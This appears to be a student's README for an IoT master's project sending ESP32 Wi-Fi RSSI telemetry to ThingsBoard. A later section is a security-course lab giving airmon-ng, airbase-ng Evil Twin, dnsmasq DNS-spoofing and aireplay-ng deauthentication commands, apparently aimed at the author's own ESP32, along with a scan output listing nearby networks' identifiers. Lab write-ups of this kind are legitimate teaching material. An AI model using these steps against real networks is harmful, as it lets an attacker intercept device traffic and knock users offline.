| Supported Targets | ESP32 | ESP32-C2 | ESP32-C3 | ESP32-C5 | ESP32-C6 | ESP32-C61 | ESP32-H2 | ESP32-H21 | ESP32-H4 | ESP32-P4 | ESP32-S2 | ESP32-S3 | Linux |
| ----------------- | ----- | -------- | -------- | -------- | -------- | --------- | -------- | --------- | -------- | -------- | -------- | -------- | ----- |

#  Práctica Final RPI-II
```
Máster IoT, curso 25-26
 	└── Autor
 		    └── Ariel Gámez <arielg01@ucm.es>
```
[repositorio](https://github.com/ariegd/miot-rpi-ii/tree/labF/src/labF) en GitHub
[video](https://youtu.be/IxZo4qbLnYY) en Youtube

## Objetivos
```
■  Seleccionar y procesar una estadística proporcionada por el sistema (ej. RSSI u otra disponible en ESP-IDF).
■  Serializar los datos usando un formato eficiente (JSON, CBOR o PBUF).
■  Transmitir datos cifrados empleando MQTT (MQTTS) o CoAP/LwM2M con DTLS.
■  Integrar la solución con ThingsBoard para telemetría, control de parámetros y visualización.
■  Permitir la actualización remota del periodo de envío desde ThingsBoard.
■  Representar la estadística de un conjunto de 4 nodos a lo largo del tiempo.
```

## Directorio del proyecto
A continuación se muestra una explicación de los archivos en la carpeta del proyecto.
```
├── CMakeLists.txt
├── components
│   ├── mqtts_comp                          <-- componente
│   │   ├── CMakeLists.txt
│   │   ├── idf_component.yml
│   │   ├── include
│   │   │   └── mqtts_comp.h
│   │   ├── Kconfig.projbuild
│   │   └── mqtts_comp.c
│   └── rssi_wifi_comp                   <-- componente
│       ├── CMakeLists.txt
│       ├── include
│       │   └── rssi_wifi_comp.h
│       ├── Kconfig.projbuild
│       └── rssi_wifi_comp.c
├── dependencies.lock
├── main
│   ├── CMakeLists.txt
│   ├── idf_component.yml
│   └── rssi_thingsboard.c
├── pytest_hello_world.py
├── README.md
├── sdkconfig
├── sdkconfig.ci
└── sdkconfig.old
```

## Problemas encontrados
 * [hilo de resolución](https://github.com/ariegd/miot-rpi-ii/blob/labF/src/labF/rssi_thingsboard/README.md)

---
# Comienza Práctica final de SL

## Para eliminar problemas de arranque de mv dentro de VirtualBox
*Nota: Esto desactiva KVM hasta el próximo reinicio. Una vez ejecutados, intenta arrancar la máquina Kali en VirtualBox de nuevo.*
```
sudo /sbin/rmmod kvm_intel
sudo /sbin/rmmod kvm

# o

sudo modprobe -r kvm_intel
```

## Trabajo con mv en VirtualBox, pero por linea de comandos
```
# 1. Apaga la máquina actual
VBoxManage controlvm "Kali-Evil" acpipowerbutton

# 2. Lánzala en modo "sin cabeza" (Headless)
VBoxManage startvm "Kali-Evil" --type headless

# 3. Confirma que está funcionando
VBoxManage list runningvms

# 4. Obtener solo la dirección IPv4 específica:
VBoxManage guestproperty get "Kali-Evil" "/VirtualBox/GuestInfo/Net/0/V4/IP"

VBoxManage guestproperty enumerate "Kali-Evil" | grep IP

# ¿Cómo trabajar con ella ahora?
ssh kali@<IP_DE_TU_NODO>
```

## Revisar las ip de la wifi, para cambiar (No funciona)
```
# En la red wifi
sudo nmap -sn 192.168.1.0/24
```

## 🚨 Ejecución del Ataque
1. Capturar el USB en Kali
Ahora sí, en el menú que muestras en la foto:
Haz clic en `Realtek 802.11n NIC [0200]`.
<img width="371" height="439" alt="Image" src="https://github.com/ariegd/miot-sl/src/labF/img/20260419_132747.jpg" />

2. Activar el driver que ya viene incluido (Legacy)
```
sudo modprobe r8188eu
lsusb
iwconfig
```

#### **Paso 1: Preparación de la Interfaz**

Primero, eliminamos procesos que puedan interferir y ponemos la tarjeta en modo monitor.

Bash
```
sudo airmon-ng check kill  
sudo airmon-ng start wlan0
```
*(A partir de ahora, tu interfaz se llamará wlan0mon)*.

#### **Paso 2: Reconocimiento (Encontrar a la víctima)**

Buscamos el canal y el BSSID (MAC del router) de tu red MOVISTAR\_3CB0.

Bash
```
sudo airodump-ng wlan0
```
*Anota el BSSID (ej. a0:64:8f:91:3c:bf), el canal (CH) y la STATION (la MAC de tu ESP32).*

#### **Paso 3: Levantar el Rogue AP (Evil Twin)**

Creamos el punto de acceso falso con el mismo nombre. Usa el mismo canal que la red original.

Bash
```
sudo airbase-ng \-e "MOVISTAR\_3CB0" \-c 1 wlan0mon
```
*(Esto creará una interfaz virtual llamada at0 en Kali, que actúa como el router falso. Deja esta terminal abierta).*

#### **Paso 4: Configurar los Servicios de Red y DNS Spoofing**

Abre una nueva terminal. Para que el ESP32 se conecte y nos envíe los datos MQTT, nuestro Kali debe actuar como servidor DHCP y falsificar la resolución DNS de ThingsBoard.

1. Asignamos IP al router falso:

Bash
```
sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
```
2. Creamos un archivo de configuración para dnsmasq (dnsmasq.conf):

Plaintext
```
interface=at0  
dhcp-range=10.0.0.10,10.0.0.50,8h  
dhcp-option=3,10.0.0.1  
dhcp-option=6,10.0.0.1  
server=8.8.8.8  
log-queries  
log-dhcp  
address=/eu.thingsboard.cloud/10.0.0.1  \# \<-- ¡AQUÍ REDIRIGIMOS EL TRÁFICO MQTT A KALI\!
```
3. Iniciamos el servicio:

Bash
```
sudo dnsmasq \-C dnsmasq.conf \-d
```
#### **Paso 5: El Ataque de Desautenticación (Forzar la conexión al Evil Twin)**

Abre una tercera terminal. Ahora vamos a expulsar al ESP32 del router real de Movistar para que se conecte automáticamente a nuestro Kali (que tendrá mejor señal o responderá más rápido).

Bash
```
sudo aireplay-ng \--deauth 100 \-a a0:64:8f:91:3c:bf \-c \<MAC\_DEL\_ESP32\> wlan0mon
```

#### **Posible salida por consola**
```
┌──(kali㉿kali)-[~]
└─$ sudo airmon-ng check kill


Killing these processes:

    PID Name
   1699 wpa_supplicant


 CH 12 ][ Elapsed: 30 s ][ 2026-04-19 07:15 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 30:68:93:D8:0D:26  -106        3        0    0   6  130   WPA2 CCMP   PSK  MOVISTAR_7BA5_EXT                                       
 42:A2:DB:1F:8B:85  -74        3        0    0   1  130   WPA2 CCMP   PSK  <length: 21>                                             
 D8:E8:44:B4:57:C8  -87      105        5    0   8  324   WPA2 CCMP   PSK  DIGIFIBRA-EzGY                                           
 CC:ED:DC:C9:53:A0  -90       55        5    0   1  130   WPA2 CCMP   PSK  MOVISTAR_53A0                                            
 A0:64:8F:91:3C:BF  -87       58       34    0   1  130   WPA2 CCMP   PSK  MOVISTAR_3CB0                                            
 24:D3:F2:AB:E9:65  -88       94       15    3   5  130   WPA2 CCMP   PSK  DIGIFIBRA-24-tKY7                                        
 E2:BB:9E:D6:CC:DD  -90        7        0    0   1   65   WPA2 CCMP   PSK  DIRECT-2u-EPSON-WF-C21000 Series                         
 48:3E:5E:10:53:50  -96       45      689    0  13  130   WPA2 CCMP   PSK  sercommBA2521                                            
 60:8D:26:FA:7F:B9  -92       85        1    0  11  195   WPA2 CCMP   PSK  Livebox6-7FBA                                            
 F4:F6:47:0F:5A:60  -96       41        0    0   4  360   WPA2 CCMP   PSK  DIGIFIBRA-QCuS                                           
 98:97:D1:0F:79:47  -93       83        6    0  11  130   WPA2 CCMP   PSK  MOVISTAR_7946                                            
 A8:A2:37:8A:FC:20  -95       66       25    1  11  195   WPA2 CCMP   PSK  Livebox6-FC21                                            
 C6:ED:DC:9F:78:80  -94       84        0    0  11  130   WPA2 CCMP   PSK  MOVISTAR_7946                                            
 CC:ED:DC:9F:78:80  -95       80        0    0  11  130   WPA2 CCMP   PSK  MOVISTAR_787E                                            
 A8:02:DB:03:2C:20  -102       27        1    0   1  130   WPA2 CCMP   PSK  DIGIFIBRA-bEE5                                          
 84:AA:9C:4D:FF:08  -100       88       11    0   9  130   WPA2 CCMP   PSK  MOVISTAR_FF07                                           
 C0:B1:01:10:5C:12  -100       18        0    0   1  130   WPA2 CCMP   PSK  DIGIFIBRA-FFGY                                          
 8C:E1:17:E6:57:76  -101       34        0    0   4  195   WPA2 CCMP   PSK  MIWIFI_2G_xMEh                                          
 44:67:47:42:C8:C6  -101        0        0    0   6  360   WPA2 CCMP   MGT  WEDU_PROF                                               
 DC:F8:B9:A0:B5:F7  -106       18        0    0   1  130   WPA2 CCMP   PSK  DIGIFIBRA-2zsu                                          
 AC:B3:B5:1A:29:EF  -106       32        0    0  11  360   WPA2 CCMP   PSK  hw_manage_29e0                                          
 58:B5:68:51:5B:2A  -101       15        0    0   1   54e  WPA2 CCMP   MGT  9aNP3OHSTe5Lc1UOLwrdXJQDKrDYICbk                        
 C0:D7:AA:FC:0B:71  -101       31        5    0   6  195   WPA2 CCMP   PSK  OrangeInfinity-0B72                                     
 44:67:47:42:C8:C4  -103       31        0    0   6  360   WPA2 CCMP   MGT  WEDU_PRIM                                               
 44:67:47:42:C8:C0  -103       33        0    0   6  360   OPN              WEDU_CM                                                 
 44:67:47:42:C8:C3  -103       30        0    0   6  360   OPN              WEDU                                                    
Quitting...
```
Qué debes observar en la pantalla:
* BSSID: Es la dirección MAC de los routers (puntos de acceso) cercanos.
* PWR: Indica la fuerza de la señal. Cuanto más cerca de 0 (ej. -30), más cerca está el router de ti.
* CH: El canal en el que está transmitiendo cada red.
* ENC: El tipo de seguridad (WPA2, WPA3, OPN).
* Sección inferior (STATION): Aquí verás las direcciones MAC de los dispositivos (móviles, tablets, laptops) que están buscando red o ya están conectados.

#### **Paso 6: Si quieres enfocarte en TU red Wi-Fi**
Si ya identificaste el BSSID de tu router y quieres ver qué dispositivos específicos hay conectados a él y cuánto tráfico generan, usa:
```
sudo airodump-ng -c [CANAL] --bssid [MAC_DEL_ROUTER] wlan0
```

## Problemas encontrados

### "huella digital" antigua
Este mensaje aparece porque anteriormente te habías conectado a otra máquina (o a la misma VM antes de reinstalarla/resetearla) que usaba la IP 192.168.1.40. Tu Debian tiene guardada una "huella digital" antigua y, al ver que la actual es diferente, te bloquea por seguridad.
La solución rápida
Solo tienes que borrar la huella antigua de tu archivo known_hosts ejecutando el comando que el mismo error te sugiere:
```
ssh-keygen -f '/home/zodd/.ssh/known_hosts' -R '192.168.1.40'
ssh kali@192.168.1.40
```
